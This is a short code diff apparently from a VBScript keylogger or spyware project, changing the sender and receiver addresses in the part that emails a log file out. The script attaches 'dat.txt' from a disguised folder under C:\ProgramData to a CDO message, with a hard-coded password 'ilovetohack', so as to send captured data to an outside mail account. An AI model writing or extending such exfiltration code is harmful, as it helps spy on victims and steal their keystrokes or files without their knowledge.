@@ -8,8 +8,8 @@ EPass = "ilovetohack" 'Password sender
 
 Set objMessage = CreateObject("CDO.Message") 'Creates objMessage
  objMessage.Subject = "Subject Here"
- objMessage.From = "cat@catsarecool.com" 'Sender
- objMessage.To = "cat@catsarecool.com" 'Receiver (can be the same as sender)
+ objMessage.From = "hackerjnk123.com" 'Sender
+ objMessage.To = "hackerjnk123.com" 'Receiver (can be the same as sender)
  objMessage.TextBody = "Log" 'e-mail 
  objMessage.AddAttachment "C:\ProgramData\wndwspdtr\dat.txt" 'Adds 'dat.txt' to the e-mail
 
